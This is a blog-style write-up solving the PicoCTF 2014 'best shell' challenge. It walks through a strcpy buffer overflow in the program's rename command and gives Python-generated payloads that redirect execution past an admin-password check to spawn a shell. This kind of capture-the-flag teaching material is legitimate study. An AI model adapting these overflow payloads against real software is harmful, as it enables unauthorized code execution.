---
title: PicoCTF Best Shell Challenge
author: 4sploit
date: 2020-05-17 18:20:00 +0300
categories: []
tags: [ctf, challenges, binary exploitation]
---
In this tutorial, i am going to solve "best shell" challenge from PicoCTF 2014.

We first download best_shell.c file using the following command:
```console
$ curl https://raw.githubusercontent.com/ctfs/write-ups-2014/master/pico-ctf-2014/binary-exploitation/best-shell-160/best_shell.c -o best_shell.c
```

A first look at main function in best_shell.c:
![main function]({{ "/assets/img/posts/picoctf-best-shell-challenge/2.png" | relative_url }})  
In C programming language, main is a function which is called by the operating system on program startup.

In lines 149-153, the program opens a file named password.txt for reading which is located in the directory /home/best_shell/.

In lines 155-157, the program reads the content of the file and stores it into an array of chars named admin_password, it then closes the file.

In lines 159-160, the program calls two functions, one to initialize an array of structs (struct data type), the struct prototype looks as follows:
![input handler struct]({{ "/assets/img/posts/picoctf-best-shell-challenge/3.png" | relative_url }})  
Here we can see that the struct consists of 2 variables, a char array named cmd and a pointer to function named handler.

We take a look at setup_handlers function:
![setup handlers function]({{ "/assets/img/posts/picoctf-best-shell-challenge/4.png" | relative_url }})
We notice the initialization of handlers array, the commands (shell, auth, rename, add, mult, lol) are the permitted commands we can use when we later run the vulnerable binary.

Next we take a look at input_loop function:
![input loop function]({{ "/assets/img/posts/picoctf-best-shell-challenge/5.png" | relative_url }})  
This function takes input from keyboard and stores it in 2 variables: cmd and arg (cmd is one of the commands we mentioned above, and arg is the  argument(s) of the specified command), it then runs the corresponding handler function (shell_handler, rename_handler, etc....).

Now we take a look at "rename" command function:
![rename handler function]({{ "/assets/img/posts/picoctf-best-shell-challenge/6.png" | relative_url }})  
Basically, this function renames an existing command name to a new one, we notice the vulnerable C function strcpy,  this function copies the buffer of one array to another without checking the length of buffer.

As we saw earlier , cmd array (in input_handler struct) can hold 32 characters.
what happens if we rename any existing command to a new one which consists of more than 32 characters and then type the new command with random argument(s)? Since cmd array is statically allocated this will lead to stack buffer overflow.

Now we compile best_shell.c code using the following command:
```console
$ gcc best_shell.c -o best_shell -fno-stack-protector -g
```
Then we create password.txt file with some random text in /home/best_shell directory, We then run it using the command ./best_shell as follows:
![best shell execute]({{ "/assets/img/posts/picoctf-best-shell-challenge/7.png" | relative_url }})  
To confirm our analysis, we type the following set of commands:
```console
>> rename lol AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA test
```
![best shell fuzzing]({{ "/assets/img/posts/picoctf-best-shell-challenge/8.png" | relative_url }})  
Great, we successfully crashed the running binary by overflowing the buffer in cmd array.

Now we use gdb to run the vulnerable binary in debug mode using the command gdb ./best_shell Then We use the following command to construct a payload to control eip register:
```console
$ python -c "print('rename lol ' + 'A'*32 + 'B'*4)"
```
![best shell debugging using gdb]({{ "/assets/img/posts/picoctf-best-shell-challenge/9.png" | relative_url }})  
As you can see, we can successfully control eip register by sending the crafted payload above.

By controlling eip register we can push an address of our choice to change the flow of the running binary and then inject our shellcode, but we notice that the vulnerable binary has a function which spawns a shell, the function is called shell_handler as follows:
![shell handler function]({{ "/assets/img/posts/picoctf-best-shell-challenge/10.png" | relative_url }})  
In order to be able to spawn a shell, we first need to be an admin (as shown in admin boolean flag)

By inspecting the other functions we notice a function which makes us admin by changing the value of admin variable to true, the function is called auth_admin_handler:
![auth admin handler function]({{ "/assets/img/posts/picoctf-best-shell-challenge/11.png" | relative_url }})  
We notice the strcmp C function which compares between 2 given strings, admin_password is the password stored in password.txt file we previously created, so if we pass it to this function it will make us admin!

The problem here is that we need to guess the password in order to spawn the shell, instead we will bypass this condition, so we run gdb ./best_shell again and then type the following command to store the payload in a file:
```console
$ python -c "print('rename lol ' + 'A'*32 + 'B' * 4 + '\n' + 'A'*32 + 'B' * 4 + ' test\n')" > payload
```
Then we run the binary and send the payload file content as input using the command run < payload\
And finally we use the command disas shell_handler to disassemble shell_handler function
![best shell exploitation]({{ "/assets/img/posts/picoctf-best-shell-challenge/12.png" | relative_url }})  
We notice je instruction which checks admin flag, we choose the address of the instruction right after it (call ..getegid),
the address of that instruction is 0x5655654b.

We replace the B's with that address, our crafted payload looks as follows now:
```console
$ python -c "print('rename lol ' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + '\n' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + ' test\n')"
```
We then run the following command to exploit the vulnerable binary:
```console
$ (python -c "print('rename lol ' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + '\n' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + ' test\n')";cat) | ./best_shell
```
![shell spawn]({{ "/assets/img/posts/picoctf-best-shell-challenge/13.png" | relative_url }})  
Excellent, we successfully spawned a shell.


